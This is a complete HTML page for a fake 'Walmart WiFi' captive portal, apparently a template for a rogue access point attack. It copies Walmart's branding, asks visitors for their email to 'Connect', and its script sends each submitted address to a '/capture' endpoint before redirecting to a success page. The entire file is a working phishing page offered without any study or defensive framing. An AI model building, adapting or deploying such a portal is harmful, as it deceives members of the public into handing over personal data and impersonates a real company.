<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Walmart WiFi</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:linear-gradient(135deg,#0071ce,#ffc220);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.container{background:white;border-radius:10px;max-width:400px;width:100%;padding:40px 30px}.logo h1{color:#0071ce;font-size:32px;text-align:center;margin-bottom:30px}h2{color:#333;text-align:center;margin-bottom:25px;font-size:20px}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;color:#555;font-weight:500}input{width:100%;padding:12px;border:2px solid #ddd;border-radius:5px;font-size:14px}input:focus{outline:none;border-color:#0071ce}button{width:100%;padding:14px;background:#0071ce;color:white;border:none;border-radius:5px;font-size:16px;font-weight:bold;cursor:pointer}</style></head><body><div class="container"><div class="logo"><h1>Walmart</h1></div><h2>Free WiFi</h2><form id="loginForm"><div class="form-group"><label>Email</label><input type="email" id="email" required placeholder="your@email.com"></div><button type="submit">Connect</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();const email=document.getElementById('email').value;console.log('[Walmart] Email:',email);fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({portal:'Walmart',email:email})}).catch(err=>console.log(err));window.location.href='success.html';});</script></body></html>
